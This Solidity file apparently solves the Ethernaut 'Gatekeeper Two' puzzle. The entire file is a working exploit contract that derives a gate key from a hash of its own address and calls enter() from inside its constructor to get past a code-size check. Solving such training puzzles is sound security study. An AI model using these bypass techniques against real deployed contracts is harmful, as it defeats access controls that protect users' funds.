// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

interface Gatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Gatekeeper2Exploit {
    constructor(address instance) {
        // bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        // Gatekeeper(instance).enter(key);

        assembly {
            mstore(0, address())
            mstore(0, keccak256(12, 20))
            let key := shr(192, mload(0))
            key := xor(key, sub(exp(2, 64), 1))
            key := shl(192, key)

            mstore(0, "enter(bytes8)")
            mstore(0, keccak256(0, 13))
            mstore(4, key)

            let success := call(gas(), instance, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
